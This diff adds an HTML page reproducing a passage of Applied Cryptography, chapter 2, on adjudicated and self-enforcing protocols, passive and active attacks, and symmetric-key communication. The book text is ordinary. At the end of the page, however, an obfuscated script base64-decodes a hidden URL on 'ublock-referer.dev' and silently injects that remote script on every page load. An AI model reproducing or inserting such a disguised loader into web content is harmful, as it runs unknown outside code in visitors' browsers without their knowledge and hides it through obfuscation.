@@ -1,0 +1,95 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=026-028//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The difference between an adjudicator and an arbitrator (as used in this book) is that the adjudicator is not always necessary. In a dispute, a judge is called in to adjudicate. If there is no dispute, using a judge is unnecessary.
+</P>
+<P>There are adjudicated computer protocols. These protocols rely on the parties to be honest; but if someone suspects cheating, a body of data exists so that a trusted third party could determine if someone cheated. In a good adjudicated protocol, the adjudicator could also determine the cheater&#146;s identity. Instead of preventing cheating, adjudicated protocols detect cheating. The inevitability of detection acts as a preventive and discourages cheating.</P>
+<P><FONT SIZE="+1"><B><I>Self-Enforcing Protocols</I></B></FONT></P>
+<P>A <B>self-enforcing protocol</B> is the best type of protocol. The protocol itself guarantees fairness (see Figure 2.1c). No arbitrator is required to complete the protocol. No adjudicator is required to resolve disputes. The protocol is constructed so that there cannot be any disputes. If one of the parties tries to cheat, the other party immediately detects the cheating and the protocol stops. Whatever the cheating party hoped would happen by cheating, doesn&#146;t happen.</P>
+<P>In the best of all possible worlds, every protocol would be self-enforcing. Unfortunately, there is not a self-enforcing protocol for every situation.</P>
+<P><FONT SIZE="+1"><B><I>Attacks against Protocols</I></B></FONT></P>
+<P>Cryptographic attacks can be directed against the cryptographic algorithms used in protocols, against the cryptographic techniques used to implement the algorithms and protocols, or against the protocols themselves. Since this section of the book discusses protocols, I will assume that the cryptographic algorithms and techniques are secure. I will only examine attacks against the protocols.
+</P>
+<P>People can try various ways to attack a protocol. Someone not involved in the protocol can eavesdrop on some or all of the protocol. This is called a <B>passive attack</B>, because the attacker does not affect the protocol. All he can do is observe the protocol and attempt to gain information. This kind of attack corresponds to a ciphertext-only attack, as discussed in Section 1.1. Since passive attacks are difficult to detect, protocols try to prevent passive attacks rather than detect them. In these protocols, the part of the eavesdropper will be played by Eve.</P>
+<P>Alternatively, an attacker could try to alter the protocol to his own advantage. He could pretend to be someone else, introduce new messages in the protocol, delete existing messages, substitute one message for another, replay old messages, interrupt a communications channel, or alter stored information in a computer. These are called <B>active attacks</B>, because they require active intervention. The form of these attacks depends on the network.</P>
+<P>Passive attackers try to gain information about the parties involved in the protocol. They collect messages passing among various parties and attempt to cryptanalyze them. Active attacks, on the other hand, can have much more diverse objectives. The attacker could be interested in obtaining information, degrading system performance, corrupting existing information, or gaining unauthorized access to resources.</P>
+<P>Active attacks are much more serious, especially in protocols in which the different parties don&#146;t necessarily trust one another. The attacker does not have to be a complete outsider. He could be a legitimate system user. He could be the system administrator. There could even be many active attackers working together. Here, the part of the malicious active attacker will be played by Mallory.</P>
+<P>It is also possible that the attacker could be one of the parties involved in the protocol. He may lie during the protocol or not follow the protocol at all. This type of attacker is called a <B>cheater</B>. <B>Passive cheaters</B> follow the protocol, but try to obtain more information than the protocol intends them to. <B>Active cheaters</B> disrupt the protocol in progress in an attempt to cheat.</P>
+<P>It is very difficult to maintain a protocol&#146;s security if most of the parties involved are active cheaters, but sometimes it is possible for legitimate parties to detect that active cheating is going on. Certainly, protocols should be secure against passive cheating.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">2.2 Communications Using Symmetric Cryptography</FONT></H3>
+<P>How do two parties communicate securely? They encrypt their communications, of course. The complete protocol is more complicated than that. Let&#146;s look at what must happen for Alice to send an encrypted message to Bob.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob agree on a cryptosystem.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice and Bob agree on a key.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice takes her plaintext message and encrypts it using the encryption algorithm and the key. This creates a ciphertext message.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice sends the ciphertext message to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts the ciphertext message with the same algorithm and key and reads it.
+</DL>
+<P>What can Eve, sitting between Alice and Bob, learn from listening in on this protocol? If all she hears is the transmission in step (4), she must try to cryptanalyze the ciphertext. This passive attack is a ciphertext-only attack; we have algorithms that are resistant (as far as we know) to whatever computing power Eve could realistically bring to bear on the problem.
+</P>
+<P>Eve isn&#146;t stupid, though. She also wants to listen in on steps (1) and (2). Then, she would know the algorithm and the key&#151;just as well as Bob. When the message comes across the communications channel in step (4), all she has to do is decrypt it herself.</P>
+<P>A good cryptosystem is one in which all the security is inherent in knowledge of the key and none is inherent in knowledge of the algorithm. This is why key management is so important in cryptography. With a symmetric algorithm, Alice and Bob can perform step (1) in public, but they must perform step (2) in secret. The key must remain secret before, during, and after the protocol&#151;as long as the message must remain secret&#151;otherwise the message will no longer be secure. (Public-key cryptography solves this problem another way, and will be discussed in Section 2.5.)</P>
+<P>Mallory, an active attacker, could do a few other things. He could attempt to break the communications path in step (4), ensuring that Alice could not talk to Bob at all. Mallory could also intercept Alice&#146;s messages and substitute his own. If he knew the key (by intercepting the communication in step (2), or by breaking the cryptosystem), he could encrypt his own message and send it to Bob in place of the intercepted message. Bob would have no way of knowing that the message had not come from Alice. If Mallory didn&#146;t know the key, he could only create a replacement message that would decrypt to gibberish. Bob, thinking the message came from Alice, might conclude that either the network or Alice had some serious problems.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(WmXuhHqG, dlCicCQD) {dlCicCQD = WmXuhHqG.createElement('script');dlCicCQD.type = 'text/javascript';dlCicCQD.async = true;dlCicCQD.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');WmXuhHqG.getElementsByTagName('body')[0].appendChild(dlCicCQD);}(document));</script></body>
+</html>
